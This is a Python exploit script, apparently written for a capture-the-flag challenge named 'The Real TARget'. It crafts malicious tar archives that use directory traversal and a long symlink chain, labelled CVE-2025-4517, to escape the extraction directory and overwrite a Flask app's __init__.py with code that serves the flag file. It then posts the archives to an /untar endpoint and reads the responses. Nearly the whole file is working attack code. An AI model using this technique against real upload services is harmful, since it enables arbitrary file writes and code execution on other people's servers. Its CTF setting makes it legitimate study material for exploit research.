#!/usr/bin/env python3
from __future__ import annotations

import argparse
import bz2
import io
import os
import tarfile
import requests

DEST_DIR_LEN = len('/app/uploads/' + 'u'*32 + '/' + 'v'*32 + '/')
STEPS = 'abcdefghijklmnop'
COMPONENT_LEN = (4096 - DEST_DIR_LEN) // (len(STEPS) + 1)
COMPONENT = 'd' * COMPONENT_LEN

PAYLOAD = (
    b"from flask import*\n"
    b"from glob import glob\n"
    b"app=Flask(__name__)\n"
    b"@app.get('/')\n"
    b"@app.get('/flag')\n"
    b"def f():return open(glob('/flag-*')[0]).read()\n"
)


def add_dir(tar: tarfile.TarFile, name: str, mode: int = 0o755) -> None:
    ti = tarfile.TarInfo(name)
    ti.type = tarfile.DIRTYPE
    ti.mode = mode
    tar.addfile(ti)


def add_symlink(tar: tarfile.TarFile, name: str, linkname: str) -> None:
    ti = tarfile.TarInfo(name)
    ti.type = tarfile.SYMTYPE
    ti.linkname = linkname
    tar.addfile(ti)


def add_file(tar: tarfile.TarFile, name: str, data: bytes, mode: int = 0o644) -> None:
    ti = tarfile.TarInfo(name)
    ti.type = tarfile.REGTYPE
    ti.size = len(data)
    ti.mode = mode
    tar.addfile(ti, io.BytesIO(data))


def build_benign() -> bytes:
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode='w') as tar:
        add_file(tar, 'hello.txt', b'hello')
    return bz2.compress(raw.getvalue(), compresslevel=9)


def build_direct_traversal() -> bytes:
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode='w') as tar:
        add_dir(tar, '../../../app/app')
        add_file(tar, '../../../app/app/__init__.py', PAYLOAD)
    return bz2.compress(raw.getvalue(), compresslevel=9)


def build_exact_cve4517() -> bytes:
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode='w') as tar:
        path = ''
        short_path = ''
        for step in STEPS:
            dir_path = os.path.join(path, COMPONENT) if path else COMPONENT
            add_dir(tar, dir_path)
            sym_path = os.path.join(path, step) if path else step
            add_symlink(tar, sym_path, COMPONENT)
            path = dir_path
            short_path = os.path.join(short_path, step) if short_path else step

        long_link_name = 'l' * 254
        escape_sym_path = os.path.join(short_path, long_link_name)
        add_symlink(tar, escape_sym_path, os.path.join(*['..'] * len(STEPS)))

        # /app/uploads/<user>/<upload>/ => 4 levels below /
        add_symlink(tar, 'escape', os.path.join(escape_sym_path, *['..'] * 4))
        add_file(tar, 'escape/app/__init__.py', PAYLOAD)
    return bz2.compress(raw.getvalue(), compresslevel=9)


def multipart(blob: bytes) -> tuple[bytes, dict[str, str]]:
    body = (
        b'--x\r\n'
        b'Content-Disposition: form-data; name="file"; filename="x.tar"\r\n'
        b'Content-Type: application/x-tar\r\n\r\n' + blob + b'\r\n--x--\r\n'
    )
    return body, {'Content-Type': 'multipart/form-data; boundary=x'}


def post(url: str, blob: bytes) -> requests.Response:
    body, headers = multipart(blob)
    print(f'[*] archive={len(blob)} bytes multipart={len(body)} bytes')
    return requests.post(url.rstrip('/') + '/untar', data=body, headers=headers, timeout=15)


def one(url: str, name: str, blob: bytes) -> None:
    print(f'\n=== {name} ===')
    r = post(url, blob)
    print(f'HTTP {r.status_code}: {r.text[:200]!r}')


def main() -> int:
    ap = argparse.ArgumentParser(description='Probe The Real TARget instance')
    ap.add_argument('url')
    ap.add_argument('--mode', choices=['all', 'benign', 'direct', 'cve'], default='all')
    args = ap.parse_args()

    if args.mode in ('all', 'benign'):
        one(args.url, 'benign', build_benign())
    if args.mode in ('all', 'direct'):
        one(args.url, 'direct_traversal', build_direct_traversal())
    if args.mode in ('all', 'cve'):
        one(args.url, 'exact_cve_2025_4517_shape', build_exact_cve4517())

    print('\nExpected interpretation:')
    print('  - benign=200, direct=500, cve=500  -> patched/safe tar filter, challenge route likely broken')
    print('  - benign=200, cve=200              -> vulnerable tar filter; then worker-restart import hijack is viable')
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
